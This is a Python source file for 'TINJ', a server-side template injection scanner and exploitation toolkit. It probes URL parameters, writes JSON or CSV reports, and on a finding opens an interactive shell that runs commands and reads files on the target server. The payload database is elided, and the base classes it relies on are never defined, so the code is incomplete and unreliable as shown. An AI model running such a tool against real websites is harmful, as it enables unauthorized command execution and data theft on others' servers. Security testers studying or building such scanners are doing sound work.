"""
Server-Side Template Injection (SSTI) Detection and Exploitation Tool
Author: Cyto0x
Version: 2.0
"""

import requests
import re
import argparse
import html
import urllib3
import json
import csv
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL/TLS warnings
urllib3.disable_warnings(InsecureRequestWarning)

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"
COLOR_BOLD = "\033[1m"
COLOR_UNDERLINE = "\033[4m"

# ASCII Art Banner
BANNER = f"""
{COLOR_RED}{COLOR_BOLD}
████████╗██╗███╗   ██╗     ██╗
╚══██╔══╝██║████╗  ██║     ██║
   ██║   ██║██╔██╗ ██║     ██║
   ██║   ██║██║╚██╗██║██   ██║
   ██║   ██║██║ ╚████║╚█████╔╝
   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚════╝ 
{COLOR_RESET}{COLOR_CYAN}
Server-Side Template Injection Toolkit
{COLOR_YELLOW}>> Version: 2.0 | By: Cyto0x <<{COLOR_RESET}
"""

# Configuration Constants
UNIQUE_PREFIX = "TINJ_"
REQUEST_TIMEOUT = 15

# Template engine payload database (same as before)
EXPLOIT_PAYLOADS = { ... }  # Keep your existing payload database

class ColorPrinter:
    """Handles colorized output formatting"""
    
    @staticmethod
    def print_banner():
        """Display the ASCII art banner"""
        print(BANNER)
        
    @staticmethod
    def success(msg):
        print(f"{COLOR_GREEN}[+] {msg}{COLOR_RESET}")
        
    @staticmethod
    def warning(msg):
        print(f"{COLOR_YELLOW}[!] {msg}{COLOR_RESET}")
        
    @staticmethod
    def error(msg):
        print(f"{COLOR_RED}[-] {msg}{COLOR_RESET}")
        
    @staticmethod
    def info(msg):
        print(f"{COLOR_CYAN}[*] {msg}{COLOR_RESET}")
        
    @staticmethod
    def verbose(msg, title="DEBUG"):
        print(f"{COLOR_MAGENTA}[~] {title}: {msg}{COLOR_RESET}")

class EnhancedSSTIScanner(SSTIScanner):
    """Extended scanner with verbose logging and reporting"""
    
    def __init__(self, proxies=None, verbose=False):
        super().__init__(proxies)
        self.verbose = verbose
        self.report_data = {
            "target": "",
            "timestamp": "",
            "findings": []
        }
        
    def _log_verbose(self, message, title="DEBUG"):
        """Log verbose messages if enabled"""
        if self.verbose:
            ColorPrinter.verbose(message, title)
            
    def scan(self, target_url, parameters):
        """
        Execute scanning with enhanced logging
        """
        self.report_data["target"] = target_url
        self.report_data["timestamp"] = datetime.now().isoformat()
        
        ColorPrinter.info(f"Starting scan against {target_url}")
        ColorPrinter.info(f"Testing parameters: {', '.join(parameters)}")
        
        result = super().scan(target_url, parameters)
        
        if result:
            self.report_data["findings"].append(result)
            ColorPrinter.success("Vulnerability Found!")
            self._print_vulnerability(result)
        else:
            ColorPrinter.error("No vulnerabilities found")
            
        return result
            
    def _print_vulnerability(self, result):
        """Colorful vulnerability display"""
        print(f"\n{COLOR_GREEN}{COLOR_BOLD}=== SSTI Vulnerability Found ==={COLOR_RESET}")
        print(f"{COLOR_CYAN}Parameter: {COLOR_WHITE}{result['parameter']}")
        print(f"{COLOR_CYAN}Engine:    {COLOR_WHITE}{result['engine']}")
        print(f"{COLOR_CYAN}Method:    {COLOR_WHITE}{result['method']}")
        print(f"{COLOR_CYAN}Evidence:  {COLOR_WHITE}{result['evidence']}")
        print(f"{COLOR_GREEN}{COLOR_BOLD}=============================={COLOR_RESET}\n")
        
    def generate_report(self, format="json", filename=None):
        """Generate output reports"""
        if not filename or not self.report_data["findings"]:
            return
            
        try:
            if format == "json":
                with open(filename, 'w') as f:
                    json.dump(self.report_data, f, indent=2)
            elif format == "csv":
                with open(filename, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(["Parameter", "Engine", "Method", "Evidence"])
                    for finding in self.report_data["findings"]:
                        writer.writerow([
                            finding["parameter"],
                            finding["engine"],
                            finding["method"],
                            finding["evidence"]
                        ])
            ColorPrinter.success(f"Report generated: {filename}")
        except Exception as e:
            ColorPrinter.error(f"Failed to generate report: {str(e)}")

def interactive_shell(exploiter):
    """Enhanced interactive shell with colors"""
    print(f"\n{COLOR_GREEN}[+] Entering {exploiter.engine} exploitation shell")
    print(f"{COLOR_YELLOW}[!] Type 'exit' to quit")
    print(f"[!] Commands will be executed on the target server{COLOR_RESET}\n")
    
    while True:
        try:
            cmd = input(f"{COLOR_RED}tinj-shell{COLOR_RESET}{COLOR_WHITE}» {COLOR_RESET}").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
                
            if cmd.startswith("read "):
                _, filename = cmd.split(" ", 1)
                result = exploiter.read_file(filename)
            else:
                result = exploiter.execute_command(cmd)
                
            if result:
                print(f"\n{COLOR_BLUE}=== Command Output ==={COLOR_RESET}")
                print(f"{COLOR_WHITE}{result}{COLOR_RESET}")
                print(f"{COLOR_BLUE}===================={COLOR_RESET}\n")
            else:
                ColorPrinter.error("No response received from server")
                
        except KeyboardInterrupt:
            print("\n[-] Terminating session...")
            break
        except Exception as e:
            ColorPrinter.error(f"Execution error: {str(e)}")

if __name__ == "__main__":
    ColorPrinter.print_banner()
    
    # Enhanced argument parser
    parser = argparse.ArgumentParser(
        description='TINJ - Template INJection Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=f"""{COLOR_CYAN}
Examples:
  Basic scan:      python tinj.py --url https://vuln-site.com
  Verbose mode:    python tinj.py --url https://vuln-site.com --verbose
  Generate report: python tinj.py --url https://vuln-site.com --output report.json --format json
{COLOR_RESET}""")
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--proxy', help='Proxy server (IP:PORT)')
    parser.add_argument('--params', default="message,email,username,name,search,q,input,id",
                      help='Parameters to test (comma-separated)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--output', help='Output file for report')
    parser.add_argument('--format', choices=['json', 'csv'], default='json',
                      help='Report format (default: json)')
    
    args = parser.parse_args()

    # Initialize scanner with enhanced features
    scanner = EnhancedSSTIScanner(
        proxies={'http': args.proxy, 'https': args.proxy} if args.proxy else None,
        verbose=args.verbose
    )
    
    # Run scan
    parameters = [p.strip() for p in args.params.split(',')]
    result = scanner.scan(args.url, parameters)
    
    # Generate report if requested
    if args.output:
        scanner.generate_report(format=args.format, filename=args.output)
    
    # Start exploitation if vulnerable
    if result:
        exploiter = SSTIExploiter(
            scanner.session,
            args.url,
            result['parameter'],
            result['engine']
        )
        interactive_shell(exploiter)
